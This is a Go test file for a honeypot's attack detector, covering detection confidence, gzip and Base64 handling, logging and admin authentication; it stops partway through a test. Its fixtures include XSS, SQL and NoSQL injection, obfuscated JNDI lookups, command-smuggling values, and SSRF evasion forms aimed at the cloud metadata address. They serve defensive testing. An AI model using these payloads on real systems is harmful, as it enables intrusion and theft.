package main

import (
	"bytes"
	"compress/gzip"
	"context"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"errors"
	"io"
	"log"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

// Check confidence for clear and ambiguous variants
func TestDetectionConfidenceCoversNewFamilies(t *testing.T) {
	tests := []struct {
		name       string
		input      detectionInput
		attackType string
		confidence confidence
	}{
		{name: "explicit XSS tag", input: detectionInput{Path: "/", RawQuery: "q=%253Cscript%253Ealert(1)%253C/script%253E"}, attackType: "XSS", confidence: confidenceHigh},
		{name: "standalone XSS event handler", input: detectionInput{Path: "/", Body: `onerror=alert(1)`}, attackType: "XSS", confidence: confidenceHigh},
		{name: "extended XSS event handler", input: detectionInput{Path: "/", Body: `<div onbeforetoggle=alert(1)>`}, attackType: "XSS", confidence: confidenceHigh},
		{name: "isolated JavaScript URI", input: detectionInput{Path: "/", RawQuery: "next=javascript%3Aalert(1)"}, attackType: "XSS", confidence: confidenceMedium},
		{name: "plain JNDI lookup", input: detectionInput{Path: "/", Header: http.Header{"User-Agent": []string{`${jndi:ldap://127.0.0.1/a}`}}}, attackType: "JNDI Injection", confidence: confidenceHigh},
		{name: "obfuscated JNDI lookup", input: detectionInput{Path: "/", RawQuery: `q=${${lower:j}${upper:n}${::-d}${::-i}:ldap://example.com/a}`}, attackType: "JNDI Injection", confidence: confidenceHigh},
		{name: "executable JSON NoSQL operator", input: detectionInput{Path: "/", Body: `{"$where":"this.active"}`}, attackType: "NoSQL Injection", confidence: confidenceHigh},
		{name: "comparison JSON NoSQL operator", input: detectionInput{Path: "/", Body: `{"age":{"$gte":18}}`}, attackType: "NoSQL Injection", confidence: confidenceMedium},
		{name: "bracket query NoSQL operator", input: detectionInput{Path: "/", RawQuery: "user%5B%24ne%5D=guest"}, attackType: "NoSQL Injection", confidence: confidenceMedium},
		{name: "dotted form NoSQL operator", input: detectionInput{Path: "/", Body: "filter.%24function=return+true", Header: http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}, attackType: "NoSQL Injection", confidence: confidenceHigh},
		{name: "numeric SQL tautology", input: detectionInput{Path: "/", RawQuery: "id=1%20OR%201=1"}, attackType: "SQL Injection", confidence: confidenceMedium},
		{name: "truncated quoted SQL tautology", input: detectionInput{Path: "/", Body: `' or '1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
		{name: "parenthesized truncated SQL tautology", input: detectionInput{Path: "/", Body: `') or ('1'='1`}, attackType: "SQL Injection", confidence: confidenceHigh},
		{name: "parenthesized union select", input: detectionInput{Path: "/", RawQuery: "id=1+union(select+password+from+users)"}, attackType: "SQL Injection", confidence: confidenceHigh},
		{name: "standalone SQL sleep", input: detectionInput{Path: "/", Body: "the fix is sleep(100) in the loop"}, attackType: "SQL Injection", confidence: confidenceMedium},
		{name: "ambiguous short command", input: detectionInput{Path: "/", RawQuery: "value=ok%3Bid"}, attackType: "Command Injection", confidence: confidenceMedium},
		{name: "explicit command after separator", input: detectionInput{Path: "/", RawQuery: "value=ok%3Bcurl%20http%3A%2F%2Fexample.com%2Fp"}, attackType: "Command Injection", confidence: confidenceHigh},
		{name: "structured command chain", input: detectionInput{Path: "/", RawQuery: "value=ok%26%26id"}, attackType: "Command Injection", confidence: confidenceHigh},
		{name: "command assignment", input: detectionInput{Path: "/", Body: `{"cmd":"id"}`}, attackType: "Command Injection", confidence: confidenceHigh},
		{name: "shell substitution", input: detectionInput{Path: "/", RawQuery: "value=%24%28id%29"}, attackType: "Command Injection", confidence: confidenceHigh},
		{name: "standalone style tag", input: detectionInput{Path: "/", Body: "use a <style> tag"}, attackType: "XSS", confidence: confidenceMedium},
		{name: "split JavaScript scheme", input: detectionInput{Path: "/", RawQuery: "next=java%09script%3Aalert(1)"}, attackType: "XSS", confidence: confidenceMedium},
		{name: "environment default JNDI lookup", input: detectionInput{Path: "/", RawQuery: `q=${env:GHONEY_MISSING_VALUE:-j}ndi:ldap://example.com/a`}, attackType: "JNDI Injection", confidence: confidenceHigh},
		{name: "explicit fetch SSRF", input: detectionInput{Path: "/", RawQuery: "fetch=http:///169.254.169.254/latest"}, attackType: "SSRF", confidence: confidenceHigh},
		{name: "ambiguous host SSRF", input: detectionInput{Path: "/", RawQuery: `host=http:\\169.254.169.254/admin`}, attackType: "SSRF", confidence: confidenceMedium},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			detections := detectAttacks(test.input)
			for _, found := range detections {
				if found.AttackType == test.attackType {
					if found.Confidence != test.confidence {
						t.Fatalf("confidence = %q, want %q", found.Confidence, test.confidence)
					}
					return
				}
			}
			t.Fatalf("missing %q detection in %+v", test.attackType, detections)
		})
	}
}

// Keep prose-like signatures below the alerting threshold
func TestAmbiguousProseNeverReachesHighConfidence(t *testing.T) {
	tests := []struct {
		name       string
		body       string
		attackType string
	}{
		{name: "stacked drop prose", body: "please stop by; drop by anytime", attackType: "SQL Injection"},
		{name: "stacked select prose", body: "pick one; select carefully", attackType: "SQL Injection"},
		{name: "sleep source example", body: "the fix is sleep(100) in the loop", attackType: "SQL Injection"},
		{name: "style documentation", body: "use a <style> tag", attackType: "XSS"},
		{name: "SVG documentation", body: "use an <svg> tag", attackType: "XSS"},
		{name: "MathML documentation", body: "use a <math> tag", attackType: "XSS"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			detections := detectAttacks(detectionInput{Path: "/guide", Body: test.body})
			for _, found := range detections {
				if found.AttackType == test.attackType {
					if found.Confidence != confidenceMedium {
						t.Fatalf("confidence = %q, want %q", found.Confidence, confidenceMedium)
					}
					return
				}
			}
			t.Fatalf("missing %q detection in %+v", test.attackType, detections)
		})
	}
}

// Cover balanced quote splitting without accepting unmatched quotes
func TestCommandDetectionHandlesSplitWords(t *testing.T) {
	tests := []struct {
		name  string
		query string
		want  bool
	}{
		{name: "semicolon", query: `value=x%3B+w%22h%22oami`, want: true},
		{name: "strong separator", query: `value=x+%26%26+w%22h%22oami`, want: true},
		{name: "substitution", query: `value=%24%28w%22h%22oami%29`, want: true},
		{name: "unmatched quote", query: `value=x%3B+w%22hoami`, want: false},
		{name: "quoted whole word", query: `value=x%3B+say+%22whoami%22`, want: false},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			found := hasDetectionType(detectAttacks(detectionInput{Path: "/", RawQuery: test.query}), "Command Injection")
			if found != test.want {
				t.Fatalf("command detection = %t, want %t", found, test.want)
			}
		})
	}
}

// Cover every ASCII control ignored inside URL schemes
func TestXSSDetectionHandlesIgnoredSchemeControls(t *testing.T) {
	queries := []string{
		"next=java%09script%3Aalert(1)",
		"next=java%0Ascript%3Aalert(1)",
		"next=java%0Dscript%3Aalert(1)",
	}
	for _, query := range queries {
		detections := detectAttacks(detectionInput{Path: "/", RawQuery: query})
		matched := false
		for _, found := range detections {
			if found.AttackType == "XSS" && found.Confidence == confidenceMedium {
				matched = true
				break
			}
		}
		if !matched {
			t.Fatalf("missing medium XSS detection in %+v", detections)
		}
	}
}

// Cover URL parser differentials and confidence for new SSRF sinks
func TestSSRFDetectionHandlesSpecialURLForms(t *testing.T) {
	tests := []struct {
		name       string
		query      string
		confidence confidence
	}{
		{name: "triple slash", query: "url=http:///169.254.169.254/latest", confidence: confidenceHigh},
		{name: "backslash authority", query: `url=http:\\169.254.169.254/latest`, confidence: confidenceHigh},
		{name: "opaque HTTP form", query: "url=http:169.254.169.254/latest", confidence: confidenceHigh},
		{name: "fetch sink", query: "fetch=http://127.0.0.1/admin", confidence: confidenceHigh},
		{name: "webhook sink", query: "webhook=http://localhost/callback", confidence: confidenceHigh},
		{name: "host sink", query: "host=http://127.0.0.1/admin", confidence: confidenceMedium},
		{name: "source sink", query: "src=http://[::1]/asset", confidence: confidenceMedium},
		{name: "image sink", query: "image=http://localhost/pixel", confidence: confidenceMedium},
		{name: "decimal metadata IP", query: "url=http://2852039166/latest", confidence: confidenceHigh},
		{name: "dotted hexadecimal IP", query: "url=http://0xa9.0xfe.0xa9.0xfe/latest", confidence: confidenceHigh},
		{name: "dotted octal IP", query: "url=http://0251.0376.0251.0376/latest", confidence: confidenceHigh},
		{name: "hyphenated nip hostname", query: "url=http://169-254-169-254.nip.io/latest", confidence: confidenceHigh},
		{name: "userinfo target", query: "url=http://example.com@169.254.169.254/latest", confidence: confidenceHigh},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			detections := detectAttacks(detectionInput{Path: "/", RawQuery: test.query})
			for _, found := range detections {
				if found.AttackType == "SSRF" {
					if found.Confidence != test.confidence {
						t.Fatalf("confidence = %q, want %q", found.Confidence, test.confidence)
					}
					return
				}
			}
			t.Fatalf("missing SSRF detection in %+v", detections)
		})
	}
}

// Keep public and relative targets out of SSRF detections
func TestSSRFDetectionRejectsSafeTargets(t *testing.T) {
	queries := []string{
		"next=/home",
		"fetch=https://example.com/release",
		"host=http://8.8.8.8/status",
		"src=https://cdn.example.com/image.svg",
		"image=data:image/png;base64,AAAA",
	}
	for _, query := range queries {
		if detections := detectAttacks(detectionInput{Path: "/", RawQuery: query}); hasDetectionType(detections, "SSRF") {
			t.Fatalf("safe query %q produced SSRF in %+v", query, detections)
		}
	}
}

// Decode structured Base64 values once while preserving their field names
func TestDetectionDecodesStructuredBase64Values(t *testing.T) {
	standardXSS := base64.StdEncoding.EncodeToString([]byte(`<script>alert(1)</script>`))
	formCommand := base64.StdEncoding.EncodeToString([]byte("whoami"))
	jsonSSRF := base64.StdEncoding.EncodeToString([]byte("http://169.254.169.254/latest"))
	urlJNDI := base64.RawURLEncoding.EncodeToString([]byte(`🍯${jndi:ldap://example.com/a}`))
	if !strings.ContainsAny(urlJNDI, "-_") {
		t.Fatal("URL safe fixture does not exercise its distinct alphabet")
	}
	tests := []struct {
		name       string
		input      detectionInput
		attackType string
	}{
		{name: "standard query value", input: detectionInput{Path: "/", RawQuery: "q=" + url.QueryEscape(standardXSS)}, attackType: "XSS"},
		{name: "form command value", input: detectionInput{Path: "/", Body: "cmd=" + url.QueryEscape(formCommand), Header: http.Header{"Content-Type": []string{"application/x-www-form-urlencoded"}}}, attackType: "Command Injection"},
		{name: "JSON URL value", input: detectionInput{Path: "/", Body: `{"url":"` + jsonSSRF + `"}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "SSRF"},
		{name: "raw URL safe value", input: detectionInput{Path: "/", RawQuery: "q=" + urlJNDI}, attackType: "JNDI Injection"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			if detections := detectAttacks(test.input); !hasDetectionType(detections, test.attackType) {
				t.Fatalf("missing %q detection in %+v", test.attackType, detections)
			}
		})
	}
}

// Bound Base64 work and avoid recursive or binary decoding
func TestStructuredBase64DecodingStaysConservative(t *testing.T) {
	inner := base64.StdEncoding.EncodeToString([]byte(`<script>alert(1)</script>`))
	doubleEncoded := base64.StdEncoding.EncodeToString([]byte(inner))
	binary := base64.StdEncoding.EncodeToString([]byte{0, 1, 2, 3, 4, 5, 6, 7})
	inputs := []detectionInput{
		{Path: "/", RawQuery: "q=" + url.QueryEscape(doubleEncoded)},
		{Path: "/", RawQuery: "session=" + url.QueryEscape(binary)},
		{Path: "/", Body: base64.StdEncoding.EncodeToString([]byte(`${jndi:ldap://example.com/a}`))},
	}
	for _, input := range inputs {
		if detections := detectAttacks(input); len(detections) != 0 {
			t.Fatalf("conservative Base64 input produced detections: %+v", detections)
		}
	}
	tooLarge := base64.StdEncoding.EncodeToString([]byte(strings.Repeat("x", maxRequestBodySize+1)))
	if _, ok := decodeBase64Text(tooLarge); ok {
		t.Fatal("oversized Base64 value was decoded")
	}

	fields := make([]string, 20)
	for index := range fields {
		encoded := base64.RawURLEncoding.EncodeToString([]byte("ordinary value"))
		fields[index] = "q=" + encoded
	}
	fields[len(fields)-1] = "q=" + base64.RawURLEncoding.EncodeToString([]byte(`<script>alert(1)</script>`))
	if detections := detectAttacks(detectionInput{Path: "/", RawQuery: strings.Join(fields, "&")}); !hasDetectionType(detections, "XSS") {
		t.Fatalf("tail Base64 candidate was not inspected: %+v", detections)
	}
	sampled := sampleBase64Fields(make([]base64Field, maxBase64Candidates+4))
	if len(sampled) != maxBase64Candidates {
		t.Fatalf("sampled Base64 fields = %d, want %d", len(sampled), maxBase64Candidates)
	}
}

// Keep textual multipart payloads visible through raw body inspection
func TestDetectionScansMultipartText(t *testing.T) {
	body := "--ghoney-boundary\r\n" +
		"Content-Disposition: form-data; name=\"q\"\r\n\r\n" +
		"<script>alert(1)</script>\r\n" +
		"--ghoney-boundary--\r\n"
	input := detectionInput{
		Path:   "/",
		Body:   body,
		Header: http.Header{"Content-Type": []string{"multipart/form-data; boundary=ghoney-boundary"}},
	}
	if detections := detectAttacks(input); !hasDetectionType(detections, "XSS") {
		t.Fatalf("multipart text was not inspected: %+v", detections)
	}
}

// Compress one request body with deterministic test handling
func gzipTestBody(t *testing.T, value string) []byte {
	t.Helper()
	var body bytes.Buffer
	writer := gzip.NewWriter(&body)
	if _, err := writer.Write([]byte(value)); err != nil {
		t.Fatalf("write gzip body: %v", err)
	}
	if err := writer.Close(); err != nil {
		t.Fatalf("close gzip body: %v", err)
	}
	return body.Bytes()
}

// Inspect gzip content while forwarding the original representation
func TestRequestInspectionHandlesGzipBodies(t *testing.T) {
	resetRecentLogs(t)
	rawBody := gzipTestBody(t, `q=<script>alert(1)</script>`)
	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
	request.Header.Set("Content-Encoding", "gzip")
	request.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	response := httptest.NewRecorder()
	var forwardedBody []byte
	var forwardedErr error
	handler := requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		forwardedBody, forwardedErr = io.ReadAll(r.Body)
		w.WriteHeader(http.StatusNoContent)
	}))

	handler.ServeHTTP(response, request)

	if response.Code != http.StatusNoContent || forwardedErr != nil {
		t.Fatalf("forwarded gzip request status=%d error=%v", response.Code, forwardedErr)
	}
	if !bytes.Equal(forwardedBody, rawBody) {
		t.Fatal("forwarded body differs from the compressed request")
	}
	logMutex.Lock()
	defer logMutex.Unlock()
	if len(recentLogs) != 1 || recentLogs[0].AttackType != "XSS" || !strings.Contains(recentLogs[0].BodySnippet, "<script>") {
		t.Fatalf("gzip detection logs = %+v", recentLogs)
	}
}

// Forward benign gzip content without creating detection events
func TestRequestInspectionForwardsBenignGzipBody(t *testing.T) {
	resetRecentLogs(t)
	rawBody := gzipTestBody(t, `{"message":"release notes","enabled":true}`)
	request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(rawBody))
	request.Header.Set("Content-Encoding", " GZip ")
	request.Header.Set("Content-Type", "application/json")
	response := httptest.NewRecorder()
	nextCalled := false
	requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
		nextCalled = true
		w.WriteHeader(http.StatusNoContent)
	})).ServeHTTP(response, request)

	if !nextCalled || response.Code != http.StatusNoContent {
		t.Fatalf("benign gzip request called=%t status=%d", nextCalled, response.Code)
	}
	logMutex.Lock()
	defer logMutex.Unlock()
	if len(recentLogs) != 0 {
		t.Fatalf("benign gzip request produced logs: %+v", recentLogs)
	}
}

// Reject malformed and oversized decoded gzip bodies before routing
func TestRequestInspectionRejectsInvalidGzipBodies(t *testing.T) {
	tests := []struct {
		name   string
		body   []byte
		status int
	}{
		{name: "malformed", body: []byte("not gzip"), status: http.StatusBadRequest},
		{name: "decoded too large", body: gzipTestBody(t, strings.Repeat("x", maxRequestBodySize+1)), status: http.StatusRequestEntityTooLarge},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			resetRecentLogs(t)
			request := httptest.NewRequest(http.MethodPost, "http://example.test/", bytes.NewReader(test.body))
			request.Header.Set("Content-Encoding", "gzip")
			response := httptest.NewRecorder()
			nextCalled := false
			requestInspectionMiddleware(http.HandlerFunc(func(http.ResponseWriter, *http.Request) {
				nextCalled = true
			})).ServeHTTP(response, request)

			if nextCalled || response.Code != test.status {
				t.Fatalf("next called=%t status=%d, want false and %d", nextCalled, response.Code, test.status)
			}
		})
	}
}

// Keep confidence in the dashboard API
func TestDashboardJSONIncludesConfidence(t *testing.T) {
	resetRecentLogs(t)
	logEvent("info", "192.0.2.3", "test", "/", "XSS", "test", "", "", confidenceMedium)
	request := httptest.NewRequest(http.MethodGet, "http://example.test/api/dashboard-data", nil)
	response := httptest.NewRecorder()
	handleDashboardData(response, request)

	var entries []LogEntry
	if err := json.Unmarshal(response.Body.Bytes(), &entries); err != nil {
		t.Fatalf("decode dashboard response: %v", err)
	}
	if len(entries) != 1 || entries[0].Confidence != confidenceMedium {
		t.Fatalf("dashboard entries = %+v, want one medium-confidence event", entries)
	}
	if version := response.Header().Get("X-Ghoney-Version"); version != dashboardVersion() {
		t.Fatalf("dashboard version = %q, want %q", version, dashboardVersion())
	}
}

// Keep unknown path scans visible as weak dashboard activity
func TestNotFoundAppearsInDashboardData(t *testing.T) {
	resetRecentLogs(t)
	request := httptest.NewRequest(http.MethodGet, "http://example.test/actuator/heapdump", nil)
	response := httptest.NewRecorder()
	publicHandler().ServeHTTP(response, request)
	if response.Code != http.StatusNotFound {
		t.Fatalf("status = %d, want %d", response.Code, http.StatusNotFound)
	}

	dashboardRequest := httptest.NewRequest(http.MethodGet, "http://example.test/api/dashboard-data", nil)
	dashboardResponse := httptest.NewRecorder()
	handleDashboardData(dashboardResponse, dashboardRequest)
	var entries []LogEntry
	if err := json.Unmarshal(dashboardResponse.Body.Bytes(), &entries); err != nil {
		t.Fatalf("decode dashboard response: %v", err)
	}
	if len(entries) != 1 || entries[0].AttackType != "NotFound" || entries[0].Confidence != "" {
		t.Fatalf("dashboard entries = %+v, want one weak NotFound event", entries)
	}
}

// Keep medium confidence detections at info level
func TestDetectionLogLevelKeepsMediumAtInfo(t *testing.T) {
	if level := detectionLogLevel(confidenceHigh); level != "warn" {
		t.Fatalf("high-confidence level = %q, want warn", level)
	}
	if level := detectionLogLevel(confidenceMedium); level != "info" {
		t.Fatalf("medium-confidence level = %q, want info", level)
	}
}

// Keep oversized concurrent log records on distinct physical lines
func TestStructuredLoggerSerializesConcurrentEvents(t *testing.T) {
	var output bytes.Buffer
	logger := log.New(&output, "", 0)
	entry := LogEntry{
		UserAgent:   strings.Repeat(`\`, maxEventFieldSize),
		Path:        strings.Repeat(`\`, maxEventFieldSize),
		AttackType:  "XSS",
		Confidence:  confidenceHigh,
		Details:     strings.Repeat(`\`, maxEventFieldSize),
		RawQuery:    strings.Repeat(`\`, maxEventFieldSize),
		BodySnippet: strings.Repeat("\x00", maxBodySnippetSize),
	}

	const eventCount = 64
	var waitGroup sync.WaitGroup
	waitGroup.Add(eventCount)
	for range eventCount {
		go func() {
			defer waitGroup.Done()
			writeStructuredEvent(logger, "warn", entry)
		}()
	}
	waitGroup.Wait()

	lines := strings.Split(strings.TrimSuffix(output.String(), "\n"), "\n")
	if len(lines) != eventCount {
		t.Fatalf("physical log lines = %d, want %d", len(lines), eventCount)
	}
	for _, line := range lines {
		if len(line) <= 4096 {
			t.Fatalf("log line length = %d, want a record larger than PIPE_BUF", len(line))
		}
		if !strings.HasPrefix(line, "level=warn ") || strings.Count(line, "level=warn ") != 1 {
			t.Fatalf("corrupted structured log line")
		}
	}
}

// Keep detection metric cardinality bounded
func TestDetectionMetricLabelsStayBounded(t *testing.T) {
	for index := 0; index < 100; index++ {
		request := httptest.NewRequest(http.MethodGet, "http://example.test/probe-"+strings.Repeat("x", index)+"?id=1+OR+1=1", nil)
		response := httptest.NewRecorder()
		requestInspectionMiddleware(http.HandlerFunc(func(w http.ResponseWriter, _ *http.Request) {
			w.WriteHeader(http.StatusNoContent)
		})).ServeHTTP(response, request)
	}

	families, err := metricsRegistry.Gather()
	if err != nil {
		t.Fatalf("gather metrics: %v", err)
	}
	for _, family := range families {
		if family.GetName() != "ghoney_honeypot_detections_total" {
			continue
		}
		// Nine families, nine route buckets and two confidences bound the series count
		if len(family.Metric) > 9*9*2 {
			t.Fatalf("detection series = %d, exceeds fixed cardinality", len(family.Metric))
		}
		allowedRoutes := map[string]bool{
			"/admin": true, "/api/v1/auth": true, "/.git/config": true,
			"/dashboard": true, "/api/dashboard-data": true, "/metrics": true,
			"/health": true, "/static/*": true, unknownMetricRoute: true,
		}
		for _, metric := range family.Metric {
			for _, label := range metric.Label {
				switch label.GetName() {
				case "confidence":
					if label.GetValue() != string(confidenceHigh) && label.GetValue() != string(confidenceMedium) {
						t.Fatalf("unbounded confidence label = %q", label.GetValue())
					}
				case "route":
					if !allowedRoutes[label.GetValue()] {
						t.Fatalf("unbounded route label = %q", label.GetValue())
					}
				case "attack_type":
					if len(label.GetValue()) > maxEventFieldSize || strings.Contains(label.GetValue(), "probe-") {
						t.Fatalf("attacker input reached attack label = %q", label.GetValue())
					}
				default:
					t.Fatalf("unexpected detection metric label = %q", label.GetName())
				}
			}
		}
		return
	}
	t.Fatal("detection metric family was not registered")
}

// Keep only the strongest confidence for each family
func TestDetectionPromotesFamilyConfidence(t *testing.T) {
	tests := []struct {
		name       string
		input      detectionInput
		attackType string
	}{
		{name: "SQL", input: detectionInput{Path: "/", RawQuery: "a=1+OR+1=1&b=1+UNION+SELECT+password+FROM+users"}, attackType: "SQL Injection"},
		{name: "XSS", input: detectionInput{Path: "/", RawQuery: "a=javascript%3Aalert(1)&b=%3Csvg+onload%3Dalert(1)%3E"}, attackType: "XSS"},
		{name: "command", input: detectionInput{Path: "/", RawQuery: "a=ok%3Bid&cmd=whoami"}, attackType: "Command Injection"},
		{name: "NoSQL", input: detectionInput{Path: "/", Body: `{"age":{"$gt":18},"$where":"true"}`}, attackType: "NoSQL Injection"},
		{name: "NoSQL across sources", input: detectionInput{Path: "/", RawQuery: "user.%24where=true", Body: `{"age":{"$gt":18}}`, Header: http.Header{"Content-Type": []string{"application/json"}}}, attackType: "NoSQL Injection"},
		{name: "SSRF", input: detectionInput{Path: "/", RawQuery: "host=http://127.0.0.1&fetch=http://169.254.169.254/latest"}, attackType: "SSRF"},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			matches := 0
			for _, found := range detectAttacks(test.input) {
				if found.AttackType == test.attackType {
					matches++
					if found.Confidence != confidenceHigh {
						t.Fatalf("promoted confidence = %q, want %q", found.Confidence, confidenceHigh)
					}
				}
			}
			if matches != 1 {
				t.Fatalf("family event count = %d, want 1", matches)
			}
		})
	}
}

// Run realistic prose and application data through the benign corpus
func TestBenignDetectionCorpus(t *testing.T) {
	inputs := []detectionInput{
		{Path: "/docs", Body: "Use curl to download the release, then inspect the environment configuration."},
		{Path: "/", Header: http.Header{"User-Agent": []string{"Mozilla/5.0 command-line curl-compatible client"}}},
		{Path: "/", Header: http.Header{"Cookie": []string{"theme=dark; notes=research & env=prod"}}},
		{Path: "/guide", Body: "The $where operator is disabled and javascript URI schemes are discussed in chapter five."},
		{Path: "/api", Body: `{"filter":"$ne is documented here","exists":true,"roles":["admin","reader"]}`},
		{Path: "/search", RawQuery: "description=%24where+is+mentioned+in+the+manual"},
		{Path: "/welcome", RawQuery: "onboarding=complete&online=true"},
		{Path: "/guide", Body: "The unionselect helper combines two internal result sets."},
		{Path: "/guide", Body: `<div data-onbeforetoggle="documented">Example markup</div>`},
		{Path: "/api", RawQuery: "session=cmVsZWFzZS1pZGVudGlmaWVy"},
	}

	for index, input := range inputs {
		if detections := detectAttacks(input); len(detections) != 0 {
			t.Fatalf("benign corpus item %d produced detections: %+v", index, detections)
		}
	}
}

// Keep strong events when the buffer receives weaker ones
func TestPriorityEvictionPreservesStrongerEvents(t *testing.T) {
	resetRecentLogs(t)
	for index := 0; index < logBufferSize; index++ {
		logEvent("warn", "192.0.2.1", "test", "/", "SQL Injection", "test", "", "", confidenceHigh)
	}
	logEvent("info", "192.0.2.2", "test", "/scan", "NotFound", "test", "", "", "")

	logMutex.Lock()
	defer logMutex.Unlock()
	if len(recentLogs) != logBufferSize {
		t.Fatalf("buffer length = %d, want %d", len(recentLogs), logBufferSize)
	}
	for _, entry := range recentLogs {
		if entry.Confidence != confidenceHigh {
			t.Fatalf("weak event evicted a high-confidence entry: %+v", entry)
		}
	}
}

// Evict the weakest stored event first
func TestPriorityEvictionUsesLowestStoredConfidence(t *testing.T) {
	resetRecentLogs(t)
	for index := 0; index < logBufferSize; index++ {
		value := confidenceMedium
		attackType := "SQL Injection"
		if index == 0 {
			value = ""
			attackType = "HoneypotAccess"
		}
		logEvent("info", "192.0.2.1", "test", "/", attackType, "test", "", "", value)
	}
	logEvent("warn", "192.0.2.2", "test", "/", "XSS", "test", "", "", confidenceHigh)

	logMutex.Lock()
	defer logMutex.Unlock()
	for _, entry := range recentLogs {
		if entry.Confidence == "" {
			t.Fatalf("high-confidence event did not evict the weakest entry: %+v", entry)
		}
	}
}

// Build credential hashes the same way as configuration loading
func testAdminCredentials(username, password string) adminCredentials {
	return adminCredentials{
		enabled:      true,
		usernameHash: sha256.Sum256([]byte(username)),
		passwordHash: sha256.Sum256([]byte(password)),
	}
}

// Check Basic Auth on every admin resource
func TestAdminBasicAuthProtectsOperationalRoutes(t *testing.T) {
	credentials := testAdminCredentials("operator", "correct horse battery staple")
	handler := adminHandler(credentials)
	protected := []string{"/dashboard", "/static/style.css", "/static/app.js", "/api/dashboard-data", "/metrics"}

	for _, path := range protected {
		t.Run(path, func(t *testing.T) {
			for _, attempt := range []struct {
				name       string
				username   string
				password   string
				wantStatus int
			}{
				{name: "absent", wantStatus: http.StatusUnauthorized},
				{name: "invalid password", username: "operator", password: "incorrect password", wantStatus: http.StatusUnauthorized},
				{name: "invalid username", username: "intruder", password: "correct horse battery staple", wantStatus: http.StatusUnauthorized},
				{name: "valid", username: "operator", password: "correct horse battery staple", wantStatus: http.StatusOK},
			} {
				t.Run(attempt.name, func(t *testing.T) {
					request := httptest.NewRequest(http.MethodGet, "http://example.test"+path, nil)
					if attempt.username != "" {
						request.SetBasicAuth(attempt.username, attempt.password)
					}
					response := httptest.NewRecorder()
					handler.ServeHTTP(response, request)
					if response.Code != attempt.wantStatus {
						t.Fatalf("status = %d, want %d", response.Code, attempt.wantStatus)
					}
				})
			}
		})
	}

	// Keep health checks available without credentials
	request := httptest.NewRequest(http.MethodGet, "http://example.test/health", nil)
	response := httptest.NewRecorder()
	handler.ServeHTTP(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("public health status = %d, want %d", response.Code, http.StatusOK)
	}
}

// Check credential rules for loopback and wildcard listeners
func TestLoadConfigEnforcesAdministrativeCredentials(t *testing.T) {
	tests := []struct {
		name      string
		address   string
		username  string
		password  string
		wantError bool
		wantAuth  bool
	}{
		{name: "native IPv4 loopback", address: "127.12.3.4:9090"},
		{name: "native IPv6 loopback", address: "[::1]:9090"},
		{name: "localhost", address: "localhost:9090"},
		{name: "mapped address is not literal", address: "[::ffff:127.0.0.1]:9090", wantError: true},
		{name: "wildcard missing password", address: ":9090", wantError: true},
		{name: "wildcard authenticated", address: ":9090", password: "sixteen-byte-key!", wantAuth: true},
		{name: "loopback opt-in auth", address: "127.0.0.1:9090", password: "sixteen-byte-key!", wantAuth: true},
		{name: "short password", address: "127.0.0.1:9090", password: "too-short", wantError: true},
		{name: "oversized password", address: "127.0.0.1:9090", password: strings.Repeat("x", maxAdminPasswordBytes+1), wantError: true},
		{name: "colon in username", address: "127.0.0.1:9090", username: "bad:user", wantError: true},
		{name: "control in username", address: "127.0.0.1:9090", username: "bad\nuser", wantError: true},
	}

	for _, test := range tests {
		t.Run(test.name, func(t *testing.T) {
			t.Setenv(envAdminAddr, test.address)
			t.Setenv(envAdminUser, test.username)
			t.Setenv(envAdminPassword, test.password)
			t.Setenv(envAdminPasswordFile, "")
			configuration, err := loadConfig()
			if (err != nil) != test.wantError {
				t.Fatalf("loadConfig() error = %v, wantError=%v", err, test.wantError)
			}
			if err == nil && configuration.adminCredential.enabled != test.wantAuth {
				t.Fatalf("admin auth enabled = %v, want %v", configuration.adminCredential.enabled, test.wantAuth)
			}
		})
	}
}

// Read one trailing line ending without changing the password itself
func TestLoadConfigSupportsAdminPasswordFile(t *testing.T) {
	passwordPath := filepath.Join(t.TempDir(), "admin-password")
	if err := os.WriteFile(passwordPath, []byte("sixteen-byte-key!\r\n"), 0o600); err != nil {
		t.Fatalf("write password file: %v", err)
	}
	t.Setenv(envAdminAddr, ":9090")
	t.Setenv(envAdminPassword, "")
	t.Setenv(envAdminPasswordFile, passwordPath)

	configuration, err := loadConfig()
	if err != nil {
		t.Fatalf("loadConfig() error = %v", err)
	}
	request := httptest.NewRequest(http.MethodGet, "http://example.test/dashboard", nil)
	request.SetBasicAuth(defaultAdminUser, "sixteen-byte-key!")
	response := httptest.NewRecorder()
	adminHandler(configuration.adminCredential).ServeHTTP(response, request)
	if response.Code != http.StatusOK {
		t.Fatalf("authenticated status = %d, want %d", response.Code, http.StatusOK)
	}
}

// Reject ambiguous, unreadable and oversized password file settings
func TestLoadConfigRejectsInvalidAdminPasswordFiles(t *testing.T) {
	temporaryDirectory := t.TempDir()
	validPath := filepath.Join(temporaryDirectory, "valid-password")
	if err := os.WriteFile(validPath, []byte("sixteen-byte-key!"), 0o600); err != nil {
		t.Fatalf("write valid password file: %v", err)
	}
	oversizedPath := filepath.Join(temporaryDirectory, "oversized-password")
	if err := os.WriteFile(oversizedPath, []byte(strings.Repeat("x", maxAdminPasswordBytes+1)), 0o600); err != nil {
		t.Fatalf("write oversized password file: %v", err)
	}

	tests := []struct {
		name         string
		password     string
		passwordFile string
	}{
